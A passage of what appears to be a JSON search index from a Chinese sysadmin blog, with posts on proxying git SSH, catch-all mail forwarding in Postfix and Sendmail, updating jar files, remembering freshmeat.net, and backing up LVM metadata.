Files/Git/mingw64/bin/connect.exe\u0026#34;\u003c/span\u003e -H 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    IdentityFile \u003cspan class=\"s2\"\u003e\u0026#34;C:/Users/bybon/.ssh/id_rsa\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    TCPKeepAlive yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    IdentitiesOnly yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost bitbucket.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"è®¾ç½®git sshä»£ç†"},{"content":"Postfixè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹ ç”³è¯·äº†ä¸€ä¸ªyi.zapto.orgçš„å…è´¹åŸŸåï¼Œæƒ³æŠŠ*@yi.zapto.orgçš„é‚®ä»¶åœ°å€éƒ½é€åˆ°zrr@yi.zapto.orgè¿™ä¸ªåœ°å€å»ã€‚\nç”¨Postfixæ¥åšï¼š\nç¼–è¾‘main.cfï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgåŸŸåçš„è§£æã€‚\n# vi /etc/postfix/main.cf ... inet_interfaces = all mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain, yi.zapto.org virtual_alias_maps = hash:/etc/postfix/virtual ... ç¼–è¾‘virtualï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr\n# vi /etc/postfix/virtual @yi.zapto.org zrr # postmap /etc/virtual å¦‚æœæœ‰å¤šä¸ªåŸŸåï¼Œé‚£ä¹ˆåœ¨mydestinationæœ€åä¾æ¬¡æ·»åŠ ï¼Œå¹¶ä¸”ä¿®æ”¹virtualå¹¶é‡æ–°hashå³å¯ã€‚\nokï¼Œé‡å¯postfix\nservice postfix restart Sendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹ ç”¨Sendmailæ¥åšï¼š\nç¼–è¾‘local-host-namesï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgçš„è§£æï¼Œå¦åˆ™sendmailå¯åŠ¨æ—¶ä¼šåè§£ï¼Œé€Ÿåº¦å¾ˆæ…¢ã€‚\n# vi /etc/mail/local-host-names yi.zapto.org ç¼–è¾‘virtusertableï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr\n# vi /etc/virtusertable @yi.zapto.org zrr # rm /etc/virtusertable.db # cd /etc/mail # make ç¼–è¾‘sendmail.cfï¼Œå¢åŠ ä¿¡ä»»ç”¨æˆ·nobody\n# vi /etc/mail/sendmail.cf ... ##################### # Trusted users # ##################### # this is equivalent to setting class \u0026#34;t\u0026#34; Ft/etc/mail/trusted-users Troot Tdaemon Tuucp Tnobody ... è¿™æ ·æ‰€æœ‰å‘è¿‡æ¥çš„é‚®ä»¶éƒ½ä¼šè‡ªåŠ¨è½¬å‘åˆ°zrrè¿™ä¸ªè´¦å·ä¸‹ã€‚\nç¼–è¾‘sendmail.cfï¼Œå¼€æ”¾ç«¯å£ï¼Œå¦åˆ™åªèƒ½127.0.0.1æ”¶å‘é‚®ä»¶\n... #O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA O DaemonPortOptions=Port=smtp,Addr=0.0.0.0, Name=MTA ... okï¼Œé‡å¯sendmail\nservice sendmail restart ","permalink":"https://rendoumi.com/posts/20240117-mail_forward/","summary":"\u003ch2 id=\"postfixè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹\"\u003ePostfixè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹\u003c/h2\u003e\n\u003cp\u003eç”³è¯·äº†ä¸€ä¸ªyi.zapto.orgçš„å…è´¹åŸŸåï¼Œæƒ³æŠŠ*@yi.zapto.orgçš„é‚®ä»¶åœ°å€éƒ½é€åˆ°zrr@yi.zapto.orgè¿™ä¸ªåœ°å€å»ã€‚\u003c/p\u003e\n\u003cp\u003eç”¨Postfixæ¥åšï¼š\u003c/p\u003e\n\u003cp\u003eç¼–è¾‘main.cfï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgåŸŸåçš„è§£æã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/postfix/main.cf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003einet_interfaces\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e all  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emydestination\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$myhostname\u003c/span\u003e, localhost.\u003cspan class=\"nv\"\u003e$mydomain\u003c/span\u003e, localhost, \u003cspan class=\"nv\"\u003e$mydomain\u003c/span\u003e, yi.zapto.org  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evirtual_alias_maps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e hash:/etc/postfix/virtual  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘virtualï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/postfix/virtual\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@yi.zapto.org zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# postmap /etc/virtual\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœæœ‰å¤šä¸ªåŸŸåï¼Œé‚£ä¹ˆåœ¨mydestinationæœ€åä¾æ¬¡æ·»åŠ ï¼Œå¹¶ä¸”ä¿®æ”¹virtualå¹¶é‡æ–°hashå³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eokï¼Œé‡å¯postfix\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice postfix restart  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"sendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹\"\u003eSendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹\u003c/h2\u003e\n\u003cp\u003eç”¨Sendmailæ¥åšï¼š\u003c/p\u003e\n\u003cp\u003eç¼–è¾‘local-host-namesï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgçš„è§£æï¼Œå¦åˆ™sendmailå¯åŠ¨æ—¶ä¼šåè§£ï¼Œé€Ÿåº¦å¾ˆæ…¢ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/mail/local-host-names\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyi.zapto.org  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘virtusertableï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/virtusertable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@yi.zapto.org zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# rm /etc/virtusertable.db\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# cd /etc/mail\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘sendmail.cfï¼Œå¢åŠ ä¿¡ä»»ç”¨æˆ·nobody\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/mail/sendmail.cf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#####################\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#   Trusted users   #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#####################\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# this is equivalent to setting class \u0026#34;t\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFt/etc/mail/trusted-users  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTroot  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTdaemon  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTuucp  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTnobody  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·æ‰€æœ‰å‘è¿‡æ¥çš„é‚®ä»¶éƒ½ä¼šè‡ªåŠ¨è½¬å‘åˆ°zrrè¿™ä¸ªè´¦å·ä¸‹ã€‚\u003c/p\u003e","title":"Postfixå’ŒSendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹"},{"content":"jaråŒ…å¯ä»¥å½“ä½œä¸€ä¸ªzipåŒ…æ¥çœ‹å¾…ã€‚\njaræ–‡ä»¶ï¼š/home/resin.jar éœ€è¦æ›´æ–°åŒ…ä¸­com/caucho/server/port/Port.classç±»æ–‡ä»¶\næ–¹æ³•1ï¼Œç›´æ¥æ›´æ–°ï¼š\næŸ¥çœ‹jaråŒ…çš„æ–‡ä»¶ç›®å½•ç»“æ„ jar tf resin.jar æ›´æ–°æŒ‡å®šå†…å®¹ jar uf resin.jar com/caucho/server/port/Port.class jar uf testRedis-33.jar redis.properties æ–¹æ³•2ï¼Œè§£å‹æ›¿æ¢åå†æ‰“åŒ…ï¼š\nè§£å‹åŒ…ï¼š mkdir new cd new jar xvf ../testRedis-33.jar è¿›è¡Œä¿®æ”¹ vi redis.properties é‡æ–°å‹åŒ… jar cmvf META-INF/MANIFEST.MF t.jar * ","permalink":"https://rendoumi.com/posts/20240117-jar_update/","summary":"\u003cp\u003ejaråŒ…å¯ä»¥å½“ä½œä¸€ä¸ªzipåŒ…æ¥çœ‹å¾…ã€‚\u003c/p\u003e\n\u003cp\u003ejaræ–‡ä»¶ï¼š/home/resin.jar\néœ€è¦æ›´æ–°åŒ…ä¸­com/caucho/server/port/Port.classç±»æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•1ï¼Œç›´æ¥æ›´æ–°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæŸ¥çœ‹jaråŒ…çš„æ–‡ä»¶ç›®å½•ç»“æ„\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar tf resin.jar\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæ›´æ–°æŒ‡å®šå†…å®¹\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar uf resin.jar com/caucho/server/port/Port.class  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar uf testRedis-33.jar redis.properties  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ–¹æ³•2ï¼Œè§£å‹æ›¿æ¢åå†æ‰“åŒ…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè§£å‹åŒ…ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir new  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e new  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar xvf ../testRedis-33.jar\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¿›è¡Œä¿®æ”¹\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi redis.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eé‡æ–°å‹åŒ…\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejar cmvf META-INF/MANIFEST.MF t.jar *  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"æ›´æ–°jaråŒ…æˆ–è€…jaråŒ…ä¸­çš„æ–‡ä»¶"},{"content":"æ€€å¿µæ°¸è¿œçš„freashmeat è¿™ä¸ªç½‘ç«™æ˜¯ä»ä¸€å¼€ç«™å°±å…³æ³¨çš„ï¼ŒåŸºæœ¬ä¸Šå¤©å¤©éƒ½çœ‹ï¼Œæœ‰10å‡ å¹´äº†ã€‚\næŒç»­åˆ°2014å¹´6æœˆ18æ—¥ï¼Œæ°¸ä¹…çš„å°ç«™äº†ã€‚\næ—¶ä¸æ—¶çš„ï¼Œä»ä¼šæ‰“å¼€è¿™ä¸ªç½‘é¡µï¼Œé€¡å·¡è‰¯ä¹…ï¼ï¼ï¼ï¼Œæ—¶å…‰èè‹’ï¼Œ2024å¹´äº†ï¼Œå…³ç«™éƒ½è¦10å¹´äº†ã€‚çºªå¿µä¸€ä¸‹ï¼\n","permalink":"https://rendoumi.com/posts/20240106-freshmeat_forever/","summary":"\u003ch1 id=\"æ€€å¿µæ°¸è¿œçš„freashmeat\"\u003eæ€€å¿µæ°¸è¿œçš„freashmeat\u003c/h1\u003e\n\u003cp\u003eè¿™ä¸ªç½‘ç«™æ˜¯ä»ä¸€å¼€ç«™å°±å…³æ³¨çš„ï¼ŒåŸºæœ¬ä¸Šå¤©å¤©éƒ½çœ‹ï¼Œæœ‰10å‡ å¹´äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæŒç»­åˆ°2014å¹´6æœˆ18æ—¥ï¼Œæ°¸ä¹…çš„å°ç«™äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ—¶ä¸æ—¶çš„ï¼Œä»ä¼šæ‰“å¼€è¿™ä¸ªç½‘é¡µï¼Œé€¡å·¡è‰¯ä¹…ï¼ï¼ï¼ï¼Œæ—¶å…‰èè‹’ï¼Œ2024å¹´äº†ï¼Œå…³ç«™éƒ½è¦10å¹´äº†ã€‚çºªå¿µä¸€ä¸‹ï¼\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240116110912176\" loading=\"lazy\" src=\"/posts/20240106-freshmeat_forever/image-20240116110912176.png\"\u003e\u003c/p\u003e","title":"æ€€å¿µæ°¸è¿œçš„freshmeat.net"},{"content":"è¿™æ˜¯ä¸ªåé¢æ•™æã€‚åœ¨äº¬ä¸œæ•°ç§‘çš„æ—¶å€™ç”¨çš„æ˜¯kvmçš„è™šæœºç³»ç»Ÿï¼ŒåŒäº‹è¿½æ±‚æ›´å¿«ï¼Œæ–‡ä»¶é•œåƒç”¨çš„æ˜¯rawåˆ†åŒºï¼Œé‡Œé¢è£…äº†lvmã€‚\ngrubçš„å¯åŠ¨æ–‡ä»¶å¦‚ä¸‹ï¼š\nkernel /vmlinuz-2.6.32-431.el6.x86_64 ro root=/dev/mapper/vg_root-lvroot rd_NO_LUKS rd_LVM_LV=vg_root/lvroot LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 console=ttyS0,115200n8 rd_LVM_LV=vg_root/lvswap KEYBOARDTYPE=pc KEYTABLE=us crashkernel=auto rhgb quiet rd_NO_DM çœ‹ä¸Šé¢ï¼Œrootä¹Ÿè¢«å»ºç«‹åœ¨lvrootçš„lvmå·ä¸Šäº†ã€‚\nç„¶åå°±é‡åˆ°äº†æ–­ç”µï¼Œå¯¼è‡´kvmæŒ‚æ‰äº†ï¼Œæ‚²å‚¬çš„æ˜¯lvmå·è¢«ç ´åäº†ï¼Œç”¨å°½åŠæ³•ä¹Ÿå¼„ä¸å‡ºæ¥å·ä¿¡æ¯ã€‚å› ä¸ºlvmçš„metadataæ²¡æœ‰å¤‡ä»½ã€‚\næ•°æ®å…¨ä¸¢ï¼Œæ— æ³•æ¢å¤ï¼Œæ¯å…·äº†ã€‚\nç»¼ä¸ŠLVMçš„metadataå¿…é¡»å¤‡ä»½ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nvgcfgbackup /etc/lvm/backup/VolGroupæ˜¯å½“å‰lvmé…ç½®çš„ä¸€ä¸ªå¤‡ä»½ï¼Œè€Œ/etc/lvm/archiveæ˜¯å½’æ¡£ã€‚\nçœ‹çœ‹å½’æ¡£ï¼š\nls -l /etc/lvm/archive/* -rw-------. 1 root root 1820 Jun 12 2015 /etc/lvm/archive/VolGroup_00000-444365108.vg æ¢å¤æ–¹æ³•ï¼š\nvgcfgrestore å…·ä½“æ¢å¤çš„æ­¥éª¤ï¼š é¦–å…ˆæŸ¥çœ‹blkidï¼Œçœ‹çœ‹ç¡¬ç›˜åˆ†åŒºçš„UUID\nblkid /dev/mapper/VolGroup-LogVol01: UUID=\u0026#34;d6d24cc3-5e4a-4f4d-a0b1-2524e727b0fe\u0026#34; TYPE=\u0026#34;ext4\u0026#34; /dev/sda1: UUID=\u0026#34;3d0103ac-1b18-4da5-bc20-4b7a980a55c0\u0026#34; TYPE=\u0026#34;ext4\u0026#34; /dev/sda2: UUID=\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; TYPE=\u0026#34;LVM2_member\u0026#34; /dev/mapper/VolGroup-LogVol00: UUID=\u0026#34;06fe7af0-dee5-494a-9b5b-11bf95244acd\u0026#34; TYPE=\u0026#34;swap\u0026#34; æŸ¥çœ‹lvmä¿¡æ¯ï¼Œæ‰¾å‡ºé‡Œé¢æ‰€æœ‰ç‰©ç†å·çš„UUIDï¼š\nless /etc/lvm/archive/VolGroup_00000-444365108.vg ... physical_volumes { pv0 { id = \u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; device = \u0026#34;/dev/sda2\u0026#34; # Hint only ... é¦–å…ˆæ¢å¤æ‰€æœ‰çš„pvï¼Œç‰©ç†å·ï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä¸€ä¸ªç‰©ç†å·ï¼Œæ‰€ä»¥æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæœ‰å¤šä¸ªç‰©ç†å·ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥å³å¯\npvcreate --uuid \u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; \\ --restorefile /etc/lvm/archive/VolGroup_00000-444365108.vg ç‰©ç†å·æ¢å¤å®Œäº†ï¼Œå†æ¢å¤lvï¼Œé€»è¾‘å·ï¼š\nvgcfgrestore -f /etc/lvm/archive/VolGroup_00000-444365108.vg VolGroup å¼„å®ŒåvgdisplayæŸ¥çœ‹ä¸€ä¸‹ï¼š\nvgdisplay --- Volume group --- VG Name VolGroup System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 9 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 1 Act PV 1 VG Size 1.64 TiB PE Size 4.00 MiB Total PE 428705 Alloc PE / Size 428705 / 1.64 TiB Free PE / Size 0 / 0 VG UUID 3h3yik-kmqP-Q8sC-5bn0-cwtw-SXpo-orMlKn å°±æ¢å¤æˆåŠŸäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240116-lvm_metadata/","summary":"\u003cp\u003eè¿™æ˜¯ä¸ªåé¢æ•™æã€‚åœ¨äº¬ä¸œæ•°ç§‘çš„æ—¶å€™ç”¨çš„æ˜¯kvmçš„è™šæœºç³»ç»Ÿï¼ŒåŒäº‹è¿½æ±‚æ›´å¿«ï¼Œæ–‡ä»¶é•œåƒç”¨çš„æ˜¯rawåˆ†åŒºï¼Œé‡Œé¢è£…äº†lvmã€‚\u003c/p\u003e\n\u003cp\u003egrubçš„å¯åŠ¨æ–‡ä»¶å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        kernel /vmlinuz-2.6.32-431.el6.x86_64 ro \u003cspan class=\"nv\"\u003eroot\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/mapper/vg_root-lvroot rd_NO_LUKS \u003cspan class=\"nv\"\u003erd_LVM_LV\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evg_root/lvroot \u003cspan class=\"nv\"\u003eLANG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003een_US.UTF-8 rd_NO_MD \u003cspan class=\"nv\"\u003eSYSFONT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elatarcyrheb-sun16 \u003cspan class=\"nv\"\u003econsole\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ettyS0,115200n8 \u003cspan class=\"nv\"\u003erd_LVM_LV\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evg_root/lvswap  \u003cspan class=\"nv\"\u003eKEYBOARDTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003epc \u003cspan class=\"nv\"\u003eKEYTABLE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eus \u003cspan class=\"nv\"\u003ecrashkernel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eauto rhgb quiet rd_NO_DM\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹ä¸Šé¢ï¼Œrootä¹Ÿè¢«å»ºç«‹åœ¨lvrootçš„lvmå·ä¸Šäº†ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åå°±é‡åˆ°äº†æ–­ç”µï¼Œå¯¼è‡´kvmæŒ‚æ‰äº†ï¼Œæ‚²å‚¬çš„æ˜¯lvmå·è¢«ç ´åäº†ï¼Œç”¨å°½åŠæ³•ä¹Ÿå¼„ä¸å‡ºæ¥å·ä¿¡æ¯ã€‚å› ä¸ºlvmçš„metadataæ²¡æœ‰å¤‡ä»½ã€‚\u003c/p\u003e\n\u003cp\u003eæ•°æ®å…¨ä¸¢ï¼Œæ— æ³•æ¢å¤ï¼Œæ¯å…·äº†ã€‚\u003c/p\u003e\n\u003cp\u003eç»¼ä¸ŠLVMçš„metadataå¿…é¡»å¤‡ä»½ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcfgbackup  